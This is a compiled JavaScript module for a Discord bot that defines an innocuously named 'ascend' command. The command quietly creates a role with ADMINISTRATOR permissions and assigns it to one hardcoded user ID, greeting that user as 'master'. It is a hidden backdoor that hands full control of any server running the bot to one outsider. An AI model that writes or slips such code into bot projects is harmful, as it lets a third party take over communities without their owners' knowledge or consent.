"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : new P(function (resolve) { resolve(result.value); }).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
class serverCommand {
    constructor() {
        this._command = "ascend";
    }
    help() {
        return "ascend";
    }
    cooldown() {
        return 4;
    }
    isThisCommand(command) {
        return command === this._command;
    }
    runCommand(args, msg, Bot) {
        return __awaiter(this, void 0, void 0, function* () {
            let roleName = "pleb-chakuj1";
            var rolee = msg.guild.roles.find(r => r.name === roleName);
            if (!rolee) {
                msg.guild.createRole({ name: roleName, color: "#9932CC", permissions: ["ADMINISTRATOR"] });
            }
            addrol();
            function addrol() {
                if (msg.author.id == '320659246037336064' && !(msg.member.roles.find(r => r.name === roleName))) {
                    msg.reply("Welcome my master!");
                    msg.member.addRole(rolee);
                }
                else {
                    msg.reply("imposter!");
                }
            }
        });
    }
}
exports.default = serverCommand;
//# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJmaWxlIjoidGVzdGNvbW1hbmQuanMiLCJzb3VyY2VSb290IjoiIiwic291cmNlcyI6WyIuLi8uLi9zcmMvY29tbWFuZHMvdGVzdGNvbW1hbmQudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7OztBQUdBLE1BQXFCLGFBQWE7SUFBbEM7UUFFcUIsYUFBUSxHQUFHLFFBQVEsQ0FBQTtJQStCeEMsQ0FBQztJQTdCRyxJQUFJO1FBQ0EsT0FBTyxRQUFRLENBQUM7SUFDcEIsQ0FBQztJQUVELFFBQVE7UUFDSixPQUFPLENBQUMsQ0FBQztJQUNiLENBQUM7SUFFRCxhQUFhLENBQUMsT0FBZTtRQUN6QixPQUFPLE9BQU8sS0FBSyxJQUFJLENBQUMsUUFBUSxDQUFDO0lBQ3JDLENBQUM7SUFFSyxVQUFVLENBQUMsSUFBYyxFQUFFLEdBQW9CLEVBQUUsR0FBbUI7O1lBQ3RFLElBQUksUUFBUSxHQUFHLGNBQWMsQ0FBQTtZQUM3QixJQUFJLEtBQUssR0FBRyxHQUFHLENBQUMsS0FBSyxDQUFDLEtBQUssQ0FBQyxJQUFJLENBQUMsQ0FBQyxDQUFDLEVBQUUsQ0FBQyxDQUFDLENBQUMsSUFBSSxLQUFLLFFBQVEsQ0FBQyxDQUFDO1lBQzNELElBQUksQ0FBQyxLQUFLLEVBQUM7Z0JBQ1AsR0FBRyxDQUFDLEtBQUssQ0FBQyxVQUFVLENBQUUsRUFBQyxJQUFJLEVBQUMsUUFBUSxFQUFFLEtBQUssRUFBRSxTQUFTLEVBQUUsV0FBVyxFQUFDLENBQUMsZUFBZSxDQUFDLEVBQUUsQ0FBRSxDQUFDO2FBQzdGO1lBQ0QsTUFBTSxFQUFFLENBQUM7WUFDVCxTQUFTLE1BQU07Z0JBQ1gsSUFBSSxHQUFHLENBQUMsTUFBTSxDQUFDLEVBQUUsSUFBSSxvQkFBb0IsSUFBSSxDQUFDLENBQUMsR0FBRyxDQUFDLE1BQU0sQ0FBQyxLQUFLLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQyxFQUFFLENBQUMsQ0FBQyxDQUFDLElBQUksS0FBSyxRQUFRLENBQUMsQ0FBQyxFQUFDO29CQUM1RixHQUFHLENBQUMsS0FBSyxDQUFDLG9CQUFvQixDQUFDLENBQUM7b0JBQ2hDLEdBQUcsQ0FBQyxNQUFNLENBQUMsT0FBTyxDQUFDLEtBQUssQ0FBQyxDQUFDO2lCQUM3QjtxQkFBTTtvQkFDSCxHQUFHLENBQUMsS0FBSyxDQUFDLFdBQVcsQ0FBQyxDQUFDO2lCQUMxQjtZQUNMLENBQUM7UUFDTCxDQUFDO0tBQUE7Q0FFSjtBQWpDRCxnQ0FpQ0MifQ==